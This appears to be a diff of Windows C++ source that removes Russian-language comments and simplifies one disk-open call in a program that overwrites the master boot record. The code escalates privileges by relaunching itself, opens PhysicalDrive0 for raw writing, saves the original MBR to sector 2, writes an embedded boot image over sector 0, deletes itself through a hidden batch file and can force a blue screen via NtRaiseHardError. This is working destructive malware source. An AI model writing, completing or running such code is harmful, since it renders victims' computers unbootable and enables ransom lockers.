@@ -7,14 +7,8 @@
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "advapi32.lib")
 
-// ============================================================
-// МАРКЕР ДЛЯ ПАТЧА (НЕ УДАЛЯТЬ!)
-// ============================================================
 const char MARKER_MBR[] = "MBR";
 
-// ============================================================
-// ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
-// ============================================================
 bool IsAdmin() {
     BOOL isAdmin = FALSE;
     PSID adminGroup = NULL;
@@ -30,9 +24,6 @@ bool IsAdmin() {
     return isAdmin == TRUE;
 }
 
-// ============================================================
-// ВКЛЮЧЕНИЕ ПРИВИЛЕГИИ ДЛЯ BSOD
-// ============================================================
 void EnableShutdownPrivilege() {
     HANDLE hToken;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
@@ -51,9 +42,6 @@ void EnableShutdownPrivilege() {
     CloseHandle(hToken);
 }
 
-// ============================================================
-// ВЫЗОВ BSOD
-// ============================================================
 void TriggerBSOD() {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) return;
@@ -76,23 +64,19 @@ void TriggerBSOD() {
     ULONG response = 0;
     
     NtRaiseHardError(
-        0xC000021A,  // CRITICAL_PROCESS_DIED
+        0xC000021A,
         1,
         0,
         params,
-        6,           // OptionShutdownSystem
+        6,
         &response
     );
 }
 
-// ============================================================
-// ПОВЫШЕНИЕ ПРАВ
-// ============================================================
 void ElevateAndRun() {
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     
-    // Получаем командную строку для передачи аргументов
     LPSTR lpCmdLine = GetCommandLineA();
     
     SHELLEXECUTEINFOA sei = {0};
@@ -107,11 +91,7 @@ void ElevateAndRun() {
     }
 }
 
-// ============================================================
-// ЗАПИСЬ MBR (ИЗ РЕСУРСА)
-// ============================================================
 void WriteMBR() {
-    // Загружаем ресурс "MBR" (BINARY)
     HRSRC hRes = FindResourceA(NULL, "MBR", "BINARY");
     if (!hRes) return;
     
@@ -122,31 +102,18 @@ void WriteMBR() {
     unsigned char* image = (unsigned char*)LockResource(hData);
     if (!image || size < 512) return;
     
-    // Открываем диск
     HANDLE hDisk = CreateFileA(
         "\\\\.\\PhysicalDrive0",
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         NULL,
         OPEN_EXISTING,
-        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
+        0,
         NULL
     );
     
-    if (hDisk == INVALID_HANDLE_VALUE) {
-        hDisk = CreateFileA(
-            "\\\\.\\PhysicalDrive0",
-            GENERIC_READ | GENERIC_WRITE,
-            FILE_SHARE_READ | FILE_SHARE_WRITE,
-            NULL,
-            OPEN_EXISTING,
-            0,
-            NULL
-        );
-        if (hDisk == INVALID_HANDLE_VALUE) return;
-    }
+    if (hDisk == INVALID_HANDLE_VALUE) return;
     
-    // --- ШАГ 1: ЧИТАЕМ ОРИГИНАЛ ---
     unsigned char originalMBR[512];
     DWORD bytesRead = 0;
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
@@ -155,7 +122,6 @@ void WriteMBR() {
         return;
     }
     
-    // --- ШАГ 2: СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОР 2 ---
     DWORD bytesWritten = 0;
     SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
     if (!WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL) || bytesWritten != 512) {
@@ -163,12 +129,10 @@ void WriteMBR() {
         return;
     }
     
-    // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ ---
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
     WriteFile(hDisk, image, size, &bytesWritten, NULL);
     CloseHandle(hDisk);
     
-    // --- Самоуничтожение ---
     char szPath[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     
@@ -189,15 +153,11 @@ void WriteMBR() {
     CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
-    // --- BSOD (если есть маркер в ресурсах) ---
     if (FindResourceA(NULL, "BSOD", RT_RCDATA)) {
         TriggerBSOD();
     }
 }
 
-// ============================================================
-// ТОЧКА ВХОДА
-// ============================================================
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
     if (!IsAdmin()) {
         ElevateAndRun();
